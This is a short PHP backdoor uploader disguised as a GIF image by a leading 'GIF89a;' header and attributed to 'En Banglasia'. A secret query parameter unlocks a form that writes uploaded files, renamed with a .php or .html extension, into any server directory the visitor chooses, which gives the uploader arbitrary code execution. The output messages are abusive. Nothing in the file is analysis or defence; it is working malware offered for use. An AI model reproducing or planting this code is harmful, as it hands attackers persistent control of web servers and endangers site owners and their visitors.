GIF89a;<title>Fuckedz By En Banglasia</title>
<?php

if($_GET['En'] == 'Banglasia'){
if($_POST['Fuckedz']){
$azzat=md5($_FILES['file']['name']).$_POST['anu'];
$ssins=pathinfo($_FILES ['file' ][ 'name']);
if(preg_match("/tooLOL/",$ssins['extension'])){
if(@copy($_FILES['file']['tmp_name'], $_POST['upto'].'/'.$azzat)){
 
echo 'Hey Idiots? Successfully!<br>'.$_POST['upto']."/".$azzat;

}else{ echo 'Hey Idiots? Failed!';}}else{
echo 'Your mother & father fucker loggers';
}}else{
echo '<title>Priv8 Uploaders By En Banglasia</title><body bgcolor=silver><br><center><form method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input name="upto" size="50" value="'.getcwd().'"><select name=anu>
<option value=".php">PHP</option>
<option value=".html">HTML</option>
</select><br><input type="file" name="file" size="20"><input type="submit" name="Fuckedz" value="Upload"></form>';
}}
